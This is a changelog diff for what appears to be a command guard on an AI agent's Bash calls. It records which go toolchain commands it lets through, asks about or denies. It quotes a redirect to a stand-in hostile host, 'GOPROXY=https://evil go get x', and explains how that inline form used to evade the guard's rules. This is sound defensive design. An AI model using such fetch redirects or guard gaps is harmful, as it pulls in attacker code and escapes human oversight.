@@ -5,6 +5,33 @@ within a release, grouped by theme. Breaking changes are called out
 explicitly in **Breaking** notes.
 
 ## v0.20.27-dev
+- **Fix (#251): the go toolchain is classified per subcommand.** It reached the
+  analyzer as unknown words, so every subcommand was judged alike: not at all.
+  The cut is *whose code*, not whether code executes. `go test` runs module
+  code exactly the way `go run` does -- init(), TestMain, every test body -- so
+  an execution/no-execution line between them does not describe the risk.
+  Running the repository's own packages is not something a static tool-call
+  guard can contain (ADR-0012: the agent authored them and can reach them
+  through Bash a hundred other ways), and `go build`, `go test` and
+  `go run ./cmd/x` are the most frequent commands a Go developer types, so
+  gating them would be friction with no containment gain.
+  What is gated: `go run <remote>` -- a target carrying an `@version` or a
+  domain-shaped first path segment -- asks as the one-step fetch-and-execute,
+  the same class as the `go get`/`go install` ask that already existed;
+  `go mod download` asks as a network fetch; `go env -w GOPROXY=…` and the
+  other fetcher levers (GOFLAGS, GONOSUMDB, GONOSUMCHECK, GOSUMDB, GOINSECURE,
+  GOPRIVATE) deny, the direct analogue of the `npm --registry` and
+  `pip --index-url` denies that were already there; `go mod edit -replace`
+  denies as a redirect to an arbitrary path, while any other `go mod edit`
+  asks, closing the gap between writing go.mod with a tool and writing it with
+  a command; and `-toolexec`/`-vettool` ask wherever they appear, because they
+  run an arbitrary program for every compile step.
+  **The inline form of the redirect needed the tokenizer.** `GOPROXY=https://evil
+  go get x` and `go get x` produce identical argv -- the shell assignment
+  prefix never reaches a rule -- so the per-invocation lever, which leaves no
+  persistent trace and is the likelier shape, was invisible. Simple now carries
+  the Go fetcher variables the same way it already carried GIT_DIR, and the
+  capture reuses that mechanism rather than inventing one.
 - **The floor now mediates the `gh` porcelain that reaches the same endpoints
   the parser watches.** #252 taught the Engine to read `gh api`'s HTTP method,
   but the porcelain subcommands reach those endpoints with no method flag to
